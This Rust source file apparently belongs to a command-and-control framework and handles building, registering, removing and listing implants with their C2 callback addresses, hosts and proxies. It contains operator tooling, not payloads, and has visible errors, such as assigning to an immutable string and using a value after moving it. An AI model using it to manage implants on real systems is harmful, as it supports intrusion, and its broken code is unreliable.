use std::fs;
use std::env;
use std::str::FromStr;
use std::sync::{Arc, Mutex};

use prettytable::{row, Table};
use reqwest::blocking::Client as Client;
use rayon::prelude::*;
use bincode;

use hexlib::error::Result;
use hexlib::error::Error::Custom;
use hexlib::types::{Hexane, HexaneStream, ServerPacket, JsonData, UserSession};

use hexlib::types::NetworkType::Http as HttpType;
use hexlib::types::NetworkType::Smb as SmbType;
use hexlib::types::NetworkOptions::Http as HttpOpts;
use hexlib::types::NetworkOptions::Smb as SmbOpts;

use crate::interface::wrap_message;
use crate::builder::HexaneBuilder;
use crate::ws::ws_update_config;

use lazy_static::lazy_static;

lazy_static! {
    pub(crate) static ref INSTANCES: Arc<Mutex<Vec<Hexane>>> = Arc::new(Mutex::new(vec![]));
    pub(crate) static ref SESSION: Mutex<UserSession> = Mutex::new(UserSession {
        username: "".to_owned(),
        is_admin: false
    });
}

pub(crate) fn load_instance(args: Vec<String>) {
    if args.len() != 3 {
        wrap_message("ERR", "invalid arguments");
        return
    }

    let mut instance = match map_json_config(&args[2]) {
        Ok(instance) => instance,
        Err(e) => {
            wrap_message("ERR", format!("load_instance: {e}").as_str());
            return
        }
    };

    let name = instance.builder_cfg.output_name.clone();
    let mut instances = INSTANCES.lock().unwrap();

    if instances.iter()
        .any(|i| i.builder_cfg.output_name == name) {
            wrap_message("ERR", format!("config with name {} already exists", name).as_str());
            return
        }

    wrap_message("INF", "building...");
    if let Err(e) = instance.setup_build() {
        wrap_message("ERR", format!("load_instance: {e}").as_str());
        return
    }

    instances.push(instance);
	// TODO: smb does not have C2 callback address and needs to be assigned one when adding to peer group
	// this is to let the update_server function contact the correct address 
	// should user be required to provide address, or automatically assigned one from a peer group?

	if let Err(e) = update_server(&instance) {
		wrap_message("ERR", format!("load_instance: {e}").as_str());
		return
	}

    wrap_message("INF", format!("{} is ready", name).as_str());
}

pub(crate) fn update_server(instance: &Hexane) ->Result<()> {
    if let Some(network) = &instance.network_cfg {

        let rtype = &network.r#type;
        let opts = &network.options;
		let address = String::new();

        let mut endpoints: Vec<String> = Vec::new();
        match (rtype, &opts) {

            (HttpType, HttpOpts(ref http)) => {
				address = &http.address;
                for endpoint in &http.endpoints {
                    endpoints.push(endpoint.clone());
                }
            }

            (SmbType, SmbOpts(ref smb)) => (),
            _ => {
                wrap_message("ERR", "serialize_instance: unknown network type");
                return Err(Custom("serialize_instance: unknown network type".to_string()))
            }
        }

		// TODO: implement session key
        let session = SESSION.lock().unwrap();
        let config_stream = HexaneStream {
            peer_id:       instance.peer_id.clone(),
            group_id:      instance.group_id.clone(),
            username:      session.username.clone(),
			address:       address.clone(),
            network_type:  rtype.clone(),
            session_key:   vec![],
            endpoints:     endpoints, 
        };

        let config = match serde_json::to_string(&config_stream) {
            Ok(data) => data,
            Err(e) => {
                wrap_message("ERR", format!("hexane serialization failed: {e}").as_str());
                Err(Custom(format!("hexane serialization failed: {e}").to_string()))
            }?
        };

		// TODO: pass the server url in the config (?)
		ws_update_config(config)
	}
	else {
		wrap_message("ERR", "serialize_instance: network configuration missing");
        Err(Custom("serialize_instance: network configuration missing".to_string()))
    }
}

pub(crate) fn remove_instance(args: Vec<String>) {
    if args.len() != 3 {
        wrap_message("ERR", "invalid arguments");
        return
    }

    let output_name = &args[2];

    let mut instances = match INSTANCES.lock() {
        Ok(instances) => instances,
        Err(_) => {
            wrap_message("ERR", "instances could not be locked");
            return
        }
    };

    if let Some(position) = instances.iter().position(|instance| instance.builder_cfg.output_name == *output_name) {
        wrap_message("INF", format!("removing {}", instances[position].builder_cfg.output_name).as_str());

        instances.remove(position);
        return
    }
    else {
        wrap_message("ERR", "implant not found");
        return
    }
}

fn map_json_config(file_path: &String) -> Result<Hexane> {
    wrap_message("INF", "reading json config...");

    let curdir = env::current_dir()
        .map_err(|e| {
            wrap_message("ERR", format!("could not get current directory: {e}").as_str());
            return Custom(e.to_string())
        });

    let json_file = curdir
        .unwrap()
        .join("json")
        .join(file_path);

    if !json_file.exists() {
        wrap_message("ERR", "json file does not exist");
        return Err(Custom("IOError".to_string()))
    }

    let contents = fs::read_to_string(json_file)
        .map_err(|e| {
            wrap_message("ERR", format!("could not read json file: {e}").as_str());
            return Custom(e.to_string())
        })?;

    let json_data = serde_json::from_str::<JsonData>(&contents)
        .map_err(|e| {
            wrap_message("ERR", format!("could not parse json data: {e}").as_str());
            return Custom(e.to_string())
        });

    let mut instance = Hexane::default();

    let config = json_data.map_err(|e| {
        wrap_message("ERR", format!("map_json_config: {e}").as_str());
        return Custom(e.to_string())
    })?;

    let session = SESSION.lock()
        .map_err(|e| {
            wrap_message("ERR", format!("map_json_config: {e}").as_str());
            return Custom(e.to_string())
        });

    instance.group_id       = 0;
    instance.main_cfg       = config.config;
    instance.loader_cfg     = config.loader;
    instance.builder_cfg    = config.builder;
    instance.network_cfg    = config.network;
    instance.user_session   = session.unwrap().clone();

    Ok(instance)
}

pub fn list_instances() {
    let instances = match INSTANCES.lock() {
        Ok(instances) => instances,
        Err(e) => {
            wrap_message("ERR", format!("could not obtain lock on instances: {e}").as_str());
            return
        }
    };

    if instances.is_empty() {
        wrap_message("INF", "no active implants available");
        return
    }

    let mut table = Table::new();
    table.set_titles(row!["gid", "pid", "name", "debug", "address", "hostname", "domain", "proxy", "user", "active"]);

    for instance in instances.iter() {

        let gid = instance.group_id.to_string();
        let pid = instance.peer_id.to_string();
        let debug = instance.main_cfg.debug.to_string();
        let active = instance.active.to_string();

        let name = &instance.builder_cfg.output_name;
        let hostname = &instance.main_cfg.hostname;
        let username = &instance.user_session.username;

        let Some(network) = &instance.network_cfg else {
            wrap_message("ERR", "list_instances: the network type did not show up somehow");
            return
        };

        let (address, _net_type, domain, proxy) = match &network.options {
            HttpOpts(http) => {
                let net_type = "http".to_string();
                let address  = format!("http://{}:{}", http.address, http.port);

                let domain = http.domain
                    .clone()
                    .unwrap_or_else(|| "null".to_string());

                let proxy = if let Some(proxy_config) = &http.proxy {
                    format!("{}://{}:{}", proxy_config.proto, proxy_config.address, proxy_config.port)
                }
                else {
                    "null".to_string()
                };

                (address, net_type, domain, proxy)
            }

            SmbOpts(smb) => {
                let address  = smb.egress_peer.clone();
                let net_type = "smb".to_string();

                (address, net_type, "null".to_string(), "null".to_string())
            }
        };

        table.add_row(row![gid, pid, name, debug, address, hostname, domain, proxy, username, active,]);
    }

    table.printstd();
}
